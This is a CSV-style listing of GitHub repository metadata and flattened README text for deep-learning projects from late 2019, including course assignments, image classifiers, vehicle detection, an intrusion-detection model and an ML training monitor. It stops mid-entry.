LakshyaMalhotra,deep-learning-specialization,n/a,Coursera Deep Learning Specialization This repository contains all the programming assignments that I completed from Deep Learning specializaion https www coursera org specializations deep learning skipBrowseRedirect true skipRecommendationsRedirect true tab completed taught by Prof Andrew Ng on coursera The specialization contains a series of five courses Course 1 Neural Networks and Deep Learning Course 2 Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization Course 3 Structuring Machine Learning Projects Course 4 Convolutional Neural Networks Course 5 Sequence Models Out of these 5 courses course 3 does not have any programming assignments But this course was amazing as it has very interesting quizzes based on case studies The programming assignments for the rest of the courses are organized in the order of the weeks they appeared in the actual specialization,2019-11-02T22:56:30Z,2019-11-03T03:12:06Z,Jupyter Notebook,LakshyaMalhotra,User,1,1,0,4,master,LakshyaMalhotra,1,0,0,0,0,0,0
firefliesqn1102,Code_Learn_Deep_Learning,n/a,CodeLearnDeepLearning,2019-11-27T02:16:27Z,2019-11-29T03:37:38Z,n/a,firefliesqn1102,User,1,1,0,1,master,firefliesqn1102,1,0,0,0,0,0,0
Muhammad-Hasham-Khalid,PIAIC-Deep-Learning,n/a,,2019-11-30T06:37:09Z,2019-12-05T08:22:14Z,n/a,Muhammad-Hasham-Khalid,User,1,1,0,0,master,,0,0,0,0,0,0,0
kamranisg,Deep_Learning_Hub,n/a,DeepLearningHub Explore exciting Projects on Deep learning in this repository 1 Image Recognition in Keras A Simple Digit Finder using Keras built on top of Tensorflow with MNIST Dataset 2 Cats and Dogs Classifier 12501 images of Cats and Dogs each used to train in a Convolutional Neural Network Visualizations on TensorBoard 3 Deep CNN on CIFAR 10 Dataset A deep Convolutional Neural Network is applied on CIFAR 10 Dataset of images having 10 classes,2019-11-12T14:16:37Z,2019-11-30T13:41:28Z,Jupyter Notebook,kamranisg,User,1,1,0,8,master,kamranisg,1,0,0,0,0,0,0
youngerous,deep-learning-from-scratch,n/a,Deep Learning http www hanbit co kr store books look php pcode B8475831198 2017 https github com WegraLee deep learning from scratch 2 redcircle http yann lecun com exdb mnist dataset 4 dataset t10k images idx3 ubyte gz https github com WegraLee deep learning from scratch raw master dataset t10k images idx3 ubyte gz t10k labels idx1 ubyte gz https github com WegraLee deep learning from scratch raw master dataset t10k labels idx1 ubyte gz train images idx3 ubyte gz https github com WegraLee deep learning from scratch raw master dataset train images idx3 ubyte gz train labels idx1 ubyte gz https github com WegraLee deep learning from scratch raw master dataset train labels idx1 ubyte gz whitecheckmark 2019 05 01 https github com WegraLee deep learning from scratch 2 whitecheckmark 2017 04 03 equationsandfigures zip https github com WegraLee deep learning from scratch blob master equationsandfigures zip raw true whitecheckmark 2017 02 26 README md whitecheckmark 2017 02 20 3 1 2 issuu https issuu com hanbit co kr docs 38d0e6451f0ddf SlideShare http www slideshare net wegra ss 70456623 Yumpu https www yumpu com xx document view 56594155 ch01 1 ch02 2 ch08 8 common dataset 3 x NumPy Matplotlib Python 3 cd ch01 python man py cd ch05 python trainnueralnet py MIT http www opensource org licenses MIT http www hanbit co kr store books look php pcode B8475831198 https www mindmeister com 812276967 https docs google com spreadsheets d 1ccwGiC01X gs3PPcXPUz67W9rS6l994LD4AL18KF10,2019-11-19T17:10:34Z,2019-12-13T16:55:43Z,Python,youngerous,User,1,1,0,10,master,youngerous,1,0,0,0,0,0,0
ZZhiming,Visualize-CNN-Deep-Learning,n/a,,2019-12-15T03:03:15Z,2019-12-15T03:04:42Z,Jupyter Notebook,ZZhiming,User,0,1,0,2,master,ZZhiming,1,0,0,0,0,0,0
gbordyugov,coursera-deep-learning-notes,n/a,My notes to Coursera deep learning specialization,2019-11-04T08:54:52Z,2019-11-08T08:33:44Z,TeX,gbordyugov,User,1,1,0,11,master,gbordyugov,1,0,0,0,0,0,0
MisaOgura,deep-reinforcement-learning,n/a,,2019-11-13T11:07:28Z,2019-11-14T09:01:02Z,Jupyter Notebook,MisaOgura,User,1,1,0,4,master,MisaOgura,1,0,0,0,0,0,0
breemen,masterclass-deep-learning,n/a,,2019-11-13T16:48:51Z,2019-12-05T09:32:03Z,Jupyter Notebook,breemen,User,1,1,0,3,master,breemen,1,0,0,0,0,1,0
Rociogomezbardon,udacity-deep-learning,n/a,udacity deep learning Repo with my exercises and projects of the udacity deep learning nanodegree I will add more projects as I finish them during the course There may be some missing projects or exercises that have not been added to this repository To run the code in these projects it is requred all the packages contained in the environment yaml file If you have docker installed just create a new enviroment with the command conda env create f environment yaml to remove enviroment use command conda remove n all,2019-11-28T13:52:54Z,2019-12-14T13:38:12Z,Jupyter Notebook,Rociogomezbardon,User,1,1,0,16,master,Rociogomezbardon,1,0,0,0,0,0,0
BupyeongHealer,Paper_review,n/a,,2019-12-08T08:26:44Z,2019-12-11T08:52:00Z,n/a,BupyeongHealer,User,1,1,0,1,master,BupyeongHealer,1,0,0,0,0,0,0
louiswang01,deep-learning-for-futures-trading,n/a,deep learning for futures trading Code main ipynb the main script with the whole workflow IHInputCreation ipynb data pre processing code models py target and benchmark models lstmtradingstrategy ipynb strategy code marketmakingstrategy ipynb strategy code dataset py dataloader class Misc lstm drawio LSTM model structure diagram,2019-11-07T03:30:09Z,2019-12-10T05:03:33Z,Jupyter Notebook,louiswang01,User,1,1,0,16,master,louiswang01,1,0,0,0,0,0,0
lmassaron,deep_learning_for_tabular_data,n/a,deeplearningfortabulardata Deep Learning can be used also for predictions based on tabular data the data you most commonly find in databases and in tables During the presentation session of this workshop it is discussed about how such an approach works and how it is competitive in respect of more popular machine learning algorithms such as gradient boosting The workshop itself demonstrates how to achieve good results using TensorFlow it high level API Keras integrated with more classical approaches based on Scikit learn and Pandas Workshop code on Colab Open in Colab https colab research google com assets colab badge svg https colab research google com github lmassaron deeplearningfortabulardata blob master deep learning for tabular data ipynb,2019-12-03T11:43:38Z,2019-12-03T19:17:41Z,Jupyter Notebook,lmassaron,User,2,1,0,4,master,lmassaron,1,0,0,0,0,0,0
seolhokim,Deep-Multi-Agent-Reinforcement-Learning,bad#counterfactual-multi-agent#deep-learning#deep-reinforcement-learning#dial#lola#machine-learning#multiagent-reinforcement-learning#rial#tutorial,description Deep Multi Agent Reinforcement Learning Hits https hits seeyoufarm com api count incr badge svg url https kilmya1 gitbook io deep multi agent reinforcement learning Written by Jakob N Foerster Translated by Seolho Kim gitbook https ora ox ac uk objects uuid a55621b3 53c0 4e1b ad1c 92438b57ffa4 https ora ox ac uk objects uuid a55621b3 53c0 4e1b ad1c 92438b57ffa4 permission gitbook commit,2019-11-27T13:50:53Z,2019-12-08T09:37:33Z,n/a,seolhokim,User,1,1,0,33,master,seolhokim,1,0,0,0,0,0,0
bispl-kaist,Deep-Learning-STEM-EDX-Tomography,n/a,,2019-11-22T22:13:53Z,2019-12-10T15:33:20Z,Python,bispl-kaist,User,1,1,0,3,master,EunjuCha,1,0,0,0,0,0,0
PulkitChauhan,Smart-Parking-using-Deep-Learning,n/a,Smart Parking using Deep Learning EasyGo Smart Parking System is a system that will solve the problem of traffic jam and make lives easy and comfortable This project will tell the people about the empty slots available for parking before reaching to their destination and hence can easily park their vehicles to their respective allotted slots The user have to go to website for login sign up After that user can choose the location by selecting the destination If the services of EasyGo are available at the destination chosen by the user then the option of booking slot will come otherwise message will pop out on window showing no services available Now user can book the slots available on the screen by clicking on it After confirmation user can pay the money accordingly Approach Part 1 First the camera will detect the empty parking slots we can also manually allocate the slots and stored their coordinated in file If we are doing manually then marking and storing coordinates of parking is one time process as all the coordinates will be stored in file Part 2 Stored coordinates will be used to determine if the object vehicle lies inside the marked coordinates then that particular slots cannot be used for parking Detection of vehicle will be done using different deep learning models Part 3 Empty slots information can be send on the Cloud server where user can get the information about empty slots available Algorithm The general flow of our smart parking system algorithm is fairly straightforward 1 First the admin will create the slots accordingly by using mouse cursor on the screen 2 Secondly the trained pre trained model will detect the respective vehicle type like car bus and motorcycle 3 Now we will find the centroid of the bounding box of the vehicle 4 If the centroid lies in the empty parking box made by admin Then the slot is occupied images block png Run coordinates py and make slots using mouse click For making one slot select top left and bottom right images admin png Run main py for detection of vehicle IGNORE person class There are 21 classes take only relevant classes for detection images detection png Sign Up page images signup PNG Login page images login png Select parking Ignore speed option still working on images parking png When other location is selected images vit PNG When only VIT chennai is selcted images vit2 PNG Availabel slots images slots png Confirmation message images message png Paymeny option images payment png,2019-12-04T14:55:25Z,2019-12-04T15:44:06Z,Python,PulkitChauhan,User,1,1,0,24,master,PulkitChauhan,1,0,0,0,0,0,0
ahmedmagdy512,CIFAR-10-Deep-Learning-Classifier,n/a,CIFAR 10 Deep Learning Classifier The CIFAR 10 dataset consists of 60000 32x32 colour images in 10 classes with 6000 images per class There are 50000 training images and 10000 test images The dataset is divided into five training batches and one test batch each with 10000 images The test batch contains exactly 1000 randomly selected images from each class The training batches contain the remaining images in random order but some training batches may contain more images from one class than another Between them the training batches contain exactly 5000 images from each class To tackle this classification problem 1 Data preprocessing A Load the data show a sample of the images in the dataset B Perform normalization for the training data and test data by dividing values in each image by 255 as it s easier for the model that way to have values in range 0 1 than values in range 0 255 C Perform one hot enconding to labels because most machine learning algorithms require numerical input and output variables After encoding each label will be an array of size 10 as they are 10 classes let say car will be encoded as 0 0 1 0 0 0 0 0 0 0 2 Constructing the model Deep learning models are constructed in this way Convolutional Layer Pooling Layer Flatten Layer Output Layer in order to achieve high accuracy you can increase the number of blocks Conv Pool as well as BatchNomalization Layer but beware of Overfitting your model To reduce overfitting you can add Dropout Layer 3 Fitting the model to the data The imageGenerator class from keras imagepreprocessing allows you to apply Data Augmentation Horizontal flip vertical flip zoom and so on In this model I tried 10 epochs and got 76 650 test accuracy and that s not bad for that number of epochs but for 100 epochs this model can achieve 85 test accuracy 4 Evaluating the model Test the model accuracy when it predicts the output of the testdata and obtain the accuracy percentage and the loss that we try to minimize,2019-12-06T22:04:58Z,2019-12-07T13:37:01Z,Jupyter Notebook,ahmedmagdy512,User,2,1,0,7,master,ahmedmagdy512,1,0,0,0,0,0,0
Eurekwah,Machine-Deep-Learning-Zoom-Table,n/a,Machine Learning Deep Learning,2019-11-27T15:06:49Z,2019-11-27T15:24:22Z,n/a,Eurekwah,User,1,1,0,1,master,Eurekwah,1,0,0,0,0,0,0
Utsav37,Speech-Enhancement-Using-Deep-Learning,n/a,Speech Enhancement using different on training targets IBM Ideal Binary Mask IRM Ideal Ratio Mask FFT Mask and Clean Speech Input Data is Standardized and Normalized For each of these we have 4 Target Labels 1 IBM Ideal Binary Mask 2 IRM Ideal Ratio Mask 3 FFT Mask 4 Clean Speech Signal Correct speech label in Time Domain It would have magnitudes of speech in time domain Thus in all we have 8 Deep Neural Networks in total 4 Standardized Data 4 Target Labels 4 Normalized Data 4 Target Labels Input Data Noisy Speech Input Data Generation Jupyter Notebook Output Data Predicted Mask for IBM IRM FFT Mask and clean speech For masked output predicted we need to generate predicted clean predicted speech from our predicted mask by appropriate processing Performance Standardized Data with IRM IBM and FFT Mask performed good File Description 1 Input Data Generation notebook Creating Training Data Created 9 training examples from original training example using three noise signals 3 and combining with every clean speech 1000 at desired signal to noise ratio of 3 0 3 db 3 Thus 3 1000 3 9000 training examples 2 Data Preprocessing Notebook Preparing Standardized and Normalized Data 3 SpeechEnhancement Notebook All Deep Neural Network trained and tested here,2019-11-02T20:07:03Z,2019-11-23T01:03:05Z,Jupyter Notebook,Utsav37,User,1,1,0,11,master,Utsav37,1,0,0,0,0,0,0
johsnows,save-self-from-deep-learning,n/a,save self from deep learning paper reading and implement hello 985 NAS acm 985 CS231n O logN python naiveacmplanning 10010preoject offer,2019-12-08T04:30:43Z,2019-12-09T12:00:56Z,n/a,johsnows,User,1,1,0,6,master,johsnows,1,0,0,0,0,0,0
Brucknem,Generalization-Ideas-in-Deep-Learning,n/a,Generalization Ideas in Deep Learning This repository holds the code and report for the Seminar Optimization and Generalization in Deep Learning https vision in tum de teaching ws2019 dltheoryws19 held by Thomas Frerix https vision in tum de members frerix from the Chair of Computer Vision Artificial Intelligence https vision in tum de at Technische Universitt Mnchen https www tum de Overview I will explore different measures for the generalization ability of neural nets Literature Exploring Generalization in Deep Learning https papers nips cc paper 7176 exploring generalization in deep learning pdf Generalization in Deep Learning https arxiv org pdf 1710 05468 pdf Path SGD Path Normalized Optimization inDeep Neural Networks https pdfs semanticscholar org 6fe0 2ad979baad659f04c3376a77dbb2cb4699a5 pdf Rademacher and Gaussian Complexities Risk Bounds and Structural Results http www jmlr org papers volume3 bartlett02a bartlett02a pdf Understanding Deep Learning requires rethinking Generalization https arxiv org pdf 1611 03530 pdf Norm Based Capacity Control in Neural Networks https arxiv org pdf 1503 00036 pdf Important links Margin https en wikipedia org wiki Marginoferror Norms https medium com montjoile l0 norm l1 norm l2 norm l infinity norm 7a7d18a4f40c Spectral Radius https en wikipedia org wiki Spectralradius VC Dim Capacity https en wikipedia org wiki Vapnik E2 80 93Chervonenkisdimension,2019-11-04T11:14:02Z,2019-12-11T13:37:02Z,Jupyter Notebook,Brucknem,User,1,1,0,93,master,Brucknem,1,0,0,6,0,0,0
krantirk,AV-Game-of-Deep-Learning,n/a,AV Game of Deep Learning AnalyticsVidhya Game of Deep Learning Computer Vision Hackathon Competition banner images banner jpg Competition Link https datahack analyticsvidhya com contest game of deep learning Problem Statement Ship or vessel detection has a wide range of applications in the areas of maritime safety fisheries management marine pollution defence and maritime security protection from piracy illegal migration etc Keeping this in mind a Governmental Maritime and Coastguard Agency is planning to deploy a computer vision based automated system to identify ship type only from the images taken by the survey boats You have been hired as a consultant to build an efficient model for this project There are 5 classes of ships to be detected which are as follows Category images category png Dataset Description There are 6252 images in train and 2680 images in test data The categories of ships and their corresponding codes in the dataset are as follows Cargo 1 Military 2 Carrier 3 Cruise 4 Tankers 5 There are three files provided to you viz train zip test csv and samplesubmission csv which have the following structure Variable Definition image Name of the image in the dataset ID column category Ship category code target column train zip contains the images corresponding to both train and test set along with the true labels for train set images in train csv Evaluation Metric The Evaluation metric for this competition is weighted F1 Score Public and Private Split Public leaderboard is based on randomly selected 30 of the test images while private leaderboard will be evaluated on remaining 70 of the test images Python 3 6 libraries fastai 1 0 51 torch 1 0 1 torchvision 0 2 2 pretrainedmodels Approach I have used fastai https fast ai cnn learner datablock api The final submission is a result of votings based on 22 submissions which were created from 22 different models based on different techniques such as different image size 299 484 599 different pre trained architectures resnet101 resnet152 densenet161 densenet169 different augmentation techniques mixup models see the code for details Score public LB score 0 9906 Rank 2 2083 private LB Score 0 9875 Rank 1 2083 Final Thoughts Although training 22 models seems very time consuming as well as computationally intensive but for small dataset like this it would be a great idea I was able to acheive private LB score similar upto 4 decimal places as the score from 22 models using only 9 models including 4 mixup models image size was fixed at 499X499 4 pre trained architectures stated above were used and lastly voting method was applied however the public score was not that great 0 9855 This suggests that we still can achieve state of the art results by training fewer models and applying right ensemble method for aggregating,2019-12-01T16:42:57Z,2019-12-02T18:24:32Z,Jupyter Notebook,krantirk,User,1,1,0,9,master,narensahu13,1,0,0,0,0,0,0
yirunzhao,AndrewNgDeepLearningTasks,n/a,AndrewNgDeepLearningTasks record deep learning process,2019-12-10T12:50:33Z,2019-12-11T08:58:27Z,Python,yirunzhao,User,1,1,0,8,master,yirunzhao,1,0,0,0,0,0,0
nidheeshnataraj,Vehicle-Detection-using-Deep-learning,n/a,VEHICLE DETECTION TRACKING AND COUNTING This sample project focuses on Vechicle Detection Tracking and Counting using TensorFlow Object Counting API https github com ahmetozlu tensorflowobjectcountingapi General Capabilities of This Project Recognition of approximate vehicle color Detection of vehicle direction of travel Prediction the speed of the vehicle Prediction of approximate vehicle size Theory System Architecture Vehicle detection and classification have been developed using TensorFlow Object Detection API Vehicle speed prediction has been developed using OpenCV via image pixel manipulation and calculation Vehicle color prediction has been developed using OpenCV via K Nearest Neighbors Machine Learning Classification Algorithm is Trained Color Histogram Features TensorFlow is an open source software library for numerical computation using data flow graphs Nodes in the graph represent mathematical operations while the graph edges represent the multidimensional data arrays tensors communicated between them OpenCV Open Source Computer Vision Library is an open source computer vision and machine learning software library OpenCV was built to provide a common infrastructure for computer vision applications and to accelerate the use of machine perception in the commercial products Tracker Source video is read frame by frame with OpenCV Each frames is processed by SSD with Mobilenet model http download tensorflow org models objectdetection ssdmobilenetv1coco20171117 is developed on TensorFlow This is a loop that continue working till reaching end of the video The main pipeline of the tracker is given at the above Figure Model By default I use an SSD with Mobilenet model in this project Installation 1 Python and pip Python is automatically installed on Ubuntu Take a moment to confirm by issuing a python V command that one of the following Python versions is already installed on your system Python 3 3 The pip or pip3 package manager is usually installed on Ubuntu Take a moment to confirm by issuing a pip V or pip3 V command that pip or pip3 is installed We strongly recommend version 8 1 or higher of pip or pip3 If Version 8 1 or later is not installed issue the following command which will either install or upgrade to the latest pip version sudo apt get install python3 pip python3 dev for Python 3 n 2 OpenCV See required commands to install OpenCV on Ubuntu 3 TensorFlow Install TensorFlow by invoking one of the following commands pip3 install tensorflow Python 3 n CPU support no GPU support pip3 install tensorflow gpu Python 3 n GPU support After completing these 3 installation steps that are given at above you can test the project by this command python3 vehicledetectionmain py,2019-11-24T17:28:05Z,2019-12-06T09:01:43Z,Python,nidheeshnataraj,User,1,1,0,5,master,nidheeshnataraj,1,0,0,0,0,0,0
bosun567,deep-learning-respberry-pi-car,automation#cnn#deep-learning#ee595#image-processing#pattern-recognition#python#raspberry-pi#voice-control,deep learning respberry pi car build a physical deep learning self driving robotic car the car is able to detect and follow lanes recognize and respond to traffic signs and people on the road this car is using TPU and respberry pi car with deep learning technology,2019-12-10T08:11:03Z,2019-12-11T02:23:56Z,Python,bosun567,User,1,1,0,4,master,bosun567,1,0,0,0,0,0,0
Jean-Tshibangu-jtm,Mon-Projet-sur-Deep-Learning,n/a,Systme de dtection d intrusion utilisant le Deep Learning Modle d apprentissage en profondeur VGG 19 form l aide de l ensemble de donnes de lInstitut Canadien pour la Cyberscurit ISCx 2017 Framework et API Tensorflow GPU Keras Outils Anaconda Python 3 6 Spyder Jupyter Comment utiliser Tlchargez l ensemble de donnes ISCX 2017 partir du lien https www unb ca cic datasets ids 2017 html N B Si votre systme est inadquat je vous demande humblement de vous arrter ici car le programme ne fonctionnera pas efficacement et beaucoup de temps sera perdu Nous avons deux fichiers dataprocessing py et constructionDeepLearning py Le premier fichier est utilis pour le prtraitement de donnes reprsentations graphiques vrifications des attributs pertinents et le second fichier comprend les codes pour la construction du modle Et vous pouvez commencer la formation BONNE CHANCE,2019-12-09T19:32:50Z,2019-12-14T12:02:58Z,Python,Jean-Tshibangu-jtm,User,1,1,0,7,master,Jean-Tshibangu-jtm,1,0,0,0,0,0,0
dufresne1108,ClassicalDeepLearningPaperReproducing,n/a,ClassicalDeepLearningPaperReproducing,2019-11-04T09:17:03Z,2019-11-04T09:17:12Z,n/a,dufresne1108,User,1,1,0,1,master,dufresne1108,1,0,0,0,0,0,0
jhagyanesh,machine_learning,n/a,,2019-11-17T10:27:26Z,2019-11-20T17:43:56Z,n/a,jhagyanesh,User,1,1,0,8,master,jhagyanesh,1,0,0,0,0,0,0
wiatrak2,ml_monitor,deep-learning#docker#grafana#machine-learning#ml#monitoring#prometheus,ML Monitor mlmonitor package introduces an effortless monitoring of a machine learning training process It also provides some useful stats about the resources utilization out of the box And most important it is designed for an easy integration with not only Jupyter but also Google Colab https colab research google com notebooks overview https github com wiatrak2 mlmonitoring blob master docs gifs overview gif raw true Requirements python 3 6 docker https www docker com Instalation 1 Clone and enter the repository bash git clone https github com wiatrak2 mlmonitor git cd mlmonitor 2 Run python configuregdrive py to configure Google Drive API developers google com drive api which is required for Colab integration You need to create a project and enter its credentials clientid and clientsecret There are two ways obtain them Go to Google Drive API python tutorial https developers google com drive api v3 quickstart python and click Enable the Drive API This will create a new project named Quickstart that is already properly configured You will see a window with Client ID and Client Secret that configuregdrive py is asking you for If you want to create a new project for mlmonitor you need to go to the Google API Console https console developers google com and Open Select a project menu next to the Google APIs logo and click New project Set the project name create it and enter Search for the Google Drive API and click Enable From the left sidebar select Credentials If you see a Configure Consent Screen button click it and fill the form entering the Application name is enough Then click Create credentials and select OAuth Client ID select Other from the next view and process You will see a window with Client ID and Client secret Paste them to the configuregdrive py 3 Install package using pip bash pip install Simple setup There are two components responsible for a successful monitoring of your training First of them is a thread that collects metrics inside your notebook or python program The second is a process that makes use of these metrics parses them and enables things like a pretty visualization These seemingly complex tasks are implemented to make usage as easy as possible let s have a look docker directory contains an easy setup of tools used for metrics visualization and analysis These are Prometheus https prometheus io and Grafana https grafana com You should firstly start these programs with docker compose up command Now you should be able to reach the Grafana admin panel on http localhost 3000 Default credentials are username admin and password mlmonitor Also a Prometheus UI should be reachable on http localhost 9090 You can learn some basics about the Prometheus and it s features here https prometheus io docs prometheus latest gettingstarted Alright lets s start the monitoring How to launch the mlmonitor inside your notebook All you need is python import mlmonitor mlmonitor init Really it s enough Now there is a background thread that already collects some metrics like CPU utilization This thread will also make use of your custom metrics when you set them with mlmonitor monitor foo 42 0 now the collector thread will also store a metric named foo with value 42 0 Metrics are already collected let s use them From the directory where your notebook is stored run python interpreter and start the mechanism that I called control as it manages all the metrics etc To start parsing the metrics collected by your local notebook use python import mlmonitor mlmonitor control start You are ready Go to the Grafana web app and have the training under control To discover how to make use of the metrics learn more about PromQL https prometheus io docs prometheus latest querying basics Following these steps will let you use the package from the very scratch I believe that there sould be as little required code lines to setup a tool as possible Therefore yo udon t have to modify your already working code to extend it with the montior Init https github com wiatrak2 mlmonitoring blob master docs gifs init gif raw true To finish the mlmonitor control and terminate the running threads use mlmonitor control stop Google Colab support Google Colab notebooks let s you run your code using some top GPUs and even TPU for free It is a great and essential tool for many ML developers When the mlmonitor project was started it main purpose was to provide a mechanism to follow any desired metrics real time Therefore mlmonitor allows you to begin the integration with Google Colab as easy as in local Jupyter notebook approach Parsing and visualization of all the metrics is again done on your local machine As code executed by Colab notebooks is separated from your device it is a bit more complicated to have a synchronized data collected by mlmonitor inside the Google Colab notebook Fortunately you can easily mount your Google Drive and use it within the notebook Moreover mlmonitor implements a simple file system to enable communication with your Google Drive Therefore during the training metrics collected with mlmonitor are stored on your Google Drive and mlmonitor control mechanism that runs on your local machine can fetch them All the details are configurable but the default configuration is enough to use all the mlmonitor features To start monitoring your Google Colab notebook you should Start the mlmonitor control that will fetch the metrics from your Google Drive and process them for tools like Grafana and Docker It is done once again with a single command python import mlmonitor mlmonitor control start During the first usage you will be asked for a verification code so the mlmonitor could communicate with your Google Drive Your browser will and should complain about security aspects but you can still obtain the code and grant the mlmonitor access to your files It is necessary as this is the only way to collect the metrics produced by your Colab notebook gdriveauth https github com wiatrak2 mlmonitoring blob master docs gifs gdriveauth gif raw true Open your Colab notebook and start monitoring with python import mlmonitor mlmonitor colab init That s it As easy as previously Moreover you can find a pre defined Grafana dashboard Colab stats that presents statistics like GPU utilization RAM usage or how long it took to fetch the metrics from your Google Drive to your local machine colabinit https github com wiatrak2 mlmonitoring blob master docs gifs colabinit gif raw true To finish the mlmonitor control and terminate the running threads use mlmonitor control stop Defining metrics Collecting metrics like value of a loss function should not require changes in already working code Also you should be made to add as few lines of code as possible Therefore if you want to monitor a metric called somestat and set its value as 0 123 all you have to do is call the mlmonitor monitor function python mlmonitor monitor somestat 0 123 This metric should be afterwards visible i e on Prometheus UI http localhost 9090 graph and charted with Grafana somestat will have assigned value 0 123 as long as it will be changed manually like python mlmonitor monitor somestat 123 0 You can call the mlmonitor monitor function the same way from both local code and Google Colab colabvalue https github com wiatrak2 mlmonitoring blob master docs gifs colabvalue gif raw true Metrics defined within python code are collected with usage of Prometheus Pushgateway https github com prometheus pushgateway You may noticed that they are described with exportedjob label which is by default mlmonitor or colabmlmonitor The exportedjob label could be used to easily filter values e g losses from specific training process Therefore mlmonitor allows you to set the exportedjob with mlmonitor settraining trainingname str function python mlmonitor settraining colabResNet50 for i in range epochs mlmonitor monitor loss loss item mlmonitor monitor epoch i You should be then able to filter values from this training using PromQL and curly braces lossexportedjob colabResNet50 colabexample https github com wiatrak2 mlmonitoring blob master docs gifs loss gif raw true Troubleshooting If during launching mlmonitor control colab or some other mechanism that may be using the Google Drive API you get the googleapiclient errors HttpError HttpError 403 when requesting https www googleapis com drive error the mlmonitor may be trying to authenticate with expired credentials Check if your current directory contains credentials json and remove it The mlmonitor package is during development and this is a very alpha version smile I hope somebody will find it helpful during long lonely model training sessions computer,2019-11-08T21:30:54Z,2019-12-10T13:22:42Z,Python,wiatrak2,User,1,1,0,41,master,wiatrak2,1,0,0,0,0,0,0
divyashie,Image-Forgery-,n/a,Image Forgery,2019-11-18T19:40:33Z,2019-11-19T17:14:05Z,Python,divyashie,User,1,1,0,2,master,divyashie,1,0,0,0,0,0,0
darya-baranovskaya,Neural-Networks-Python,n/a,,2019-11-05T21:35:33Z,2019-11-27T23:55:25Z,Jupyter Notebook,darya-baranovskaya,User,1,1,0,7,master,darya-baranovskaya,1,0,0,1,0,1,0
JasonMillette,WheresWaldo,n/a,WheresWaldo ECE498 deep learning project,2019-11-04T16:49:47Z,2019-12-08T20:22:57Z,Python,JasonMillette,User,1,1,0,26,master,SpencerGoulette#JasonMillette,2,0,0,0,0,0,0
ForrestPi,DL_module,n/a,DLmodule deep learning module,2019-11-13T06:05:03Z,2019-12-06T06:45:18Z,Python,ForrestPi,User,1,1,0,12,master,ForrestPi,1,0,0,0,0,0,0
Alan-D-Chen,machinelearning_deeplearning,n/a,machinelearningdeeplearning The algorithms of common just for machine learning and deep learning Deep learning descion tree https github com Alan D Chen DeepLearning Demo for KNN K Nearest Neighbor Iris module a classical test in data analysis in Python https github com Alan D Chen KNNML 3 demoes for SVM algorithms https github com Alan D Chen SVMmachineLearning Demo for PCA Principal Component Analysis ICA Independent Component Analysis https github com Alan D Chen PCAICADEMO Handwritten numerals recognition classification Neural Network https github com Alan D Chen neural network NN,2019-11-26T15:58:34Z,2019-11-27T03:51:19Z,n/a,Alan-D-Chen,User,1,1,0,3,master,Alan-D-Chen,1,0,0,0,0,0,0
goozp,MachineLearning-Notes,n/a,MachineLearning Notes NumPy Scikit learn TensorFlow 1 X TensorFlow 2 X 0 Basics 1 Basic Models 1 1 Linear Regression Linear Regression notebook https github com goozp mldl example blob master basic linear simple linear tf2 ipynb TensorFlow 2 X Keras 1 2 Word2Vec Word Embedding Skip gram notebook https github com goozp mldl example blob master basic word2vec skip gram tf1 ipynb TensorFlow 1 X Skip gram 2 Neural Networks 2 1 Simple Neural Networks Simple 3 Layer Neural Network notebook https github com goozp mldl example blob master nn simple 3 layer nn python ipynb Python NumPy 3 MNIST Multi layer Perceptron MLP notebook https github com goozp mldl example blob master nn mlp mlp tf2 ipynb TensorFlow 2 X MNIST 2 2 Convolution Neural Networks CNN Convolution Neural Networks notebook https github com goozp mldl example blob master nn cnn cnn tf2 ipynb TensorFlow 2 X CNNMNIST 2 3 Recurrent Neural Networks RNN Recurrent Neural Networks notebook https github com goozp mldl example blob master nn rnn rnn tf2 ipynb TensorFlow 2 X RNN LSTM Recurrent Neural Networks notebook https github com goozp mldl example blob master nn rnn RNN LSTM 2 layers sequential ipynb TensorFlow 2 XKeras Sequential LSTM RNN LSTM Recurrent Neural Networks notebook https github com goozp mldl example blob master nn rnn RNN LSTM 2 layers api ipynb TensorFlow 2 XKeras Model LSTM RNN LSTM Bi directional Recurrent Neural Network notebook https github com goozp mldl example blob master nn rnn RNN LSTM 2 layers api ipynb TensorFlow 2 XKeras Model LSTM RNN GRU Recurrent Neural Networks notebook https github com goozp mldl example blob master nn rnn RNN LSTM 2 layers api ipynb TensorFlow 2 XKeras Model GRU RNN Reference github com aymericdamien TensorFlow Examples https github com aymericdamien TensorFlow Examples Python TensorFlow 2 0 A Concise Handbook of TensorFlow 2 0 https tf wiki,2019-11-25T15:42:19Z,2019-12-12T12:07:49Z,Jupyter Notebook,goozp,User,1,1,0,11,master,goozp,1,0,0,0,0,0,0
valterlej,deeplearningwithpython,n/a,Deep Learning With Python Examples from Deep Learning with Python by Franois Chollet Summary Listing Title Page File 2 1 Loading the MNIST dataset in keras 27 Chapter2 listing2 1 py 2 2 The network architecture 28 Chapter2 listing2 2 5 py 2 3 The compilation step 29 2 4 Preparing the image data 29 2 5 Preparing the labels 29 2 6 Displaying the fourth digit 33 Chapter2 listing2 6 py 3 1 Loading the IMDB dataset 68 Chapter3 listing3 1 10 py 3 2 Encoding the integer sequences into a binary matrix 69 3 3 The model definition 72 3 4 Compiling the model 73 3 5 Configuring the optimizer 73 3 6 Using custom losses and metrics 73 3 7 Setting aside a validation set 73 3 8 Training your model 74 3 9 Plotting the training and validation loss 74 3 10 Plotting the training and validation accuracy 75 3 11 Retraining a model from scratch 76 Chapter3 listing3 11 py 3 12 Loading the Reuters dataset 78 Chapter3 listing3 12 20 py 3 13 Decoding newswires bach to text 78 3 14 Encoding the data 79 3 15 Model definition 80 3 16 Compiling the model 80 3 17 Setting aside a validation set 80 3 18 Training the model 81 3 19 Plotting the training and validation loss 81 3 20 Plotting the training and validation accuracy 81 3 21 Retraining a model from scratch 82 Chapter3 listing3 21 22 py 3 22 Generating predictions for new data 83 3 23 A model with an information bottleneck 84 Chapter3 listing3 23 py 3 24 Loading the Boston housing dataset 86 Chapter3 listing3 24 27 py 3 25 Normalizing the data 86 3 26 Model definition 86 3 27 K fold validation 87 3 28 Saving the validation logs at each fold 88 Chapter3 listing3 28 31 py 3 29 Building the history of successive mean K fold validation scores 89 3 30 Plotting validation scores 89 3 31 Plotting validation scores excluding the first 10 data points 90 3 32 Training the final model 90 Chapter3 listing3 32 py 4 1 Hold out validation 98 Chapter4 listing4 1 py 4 2 K fold cross validation 99 Chapter4 listing4 2 py 4 3 Original model 105 Chapter4 listing4 3 5 py 4 4 Version of the model with lower capacity 105 4 5 Version of the model with higher capacity 106 4 6 Adding L2 weight regularization to the model 108 Chapter4 listing4 6 7 py 4 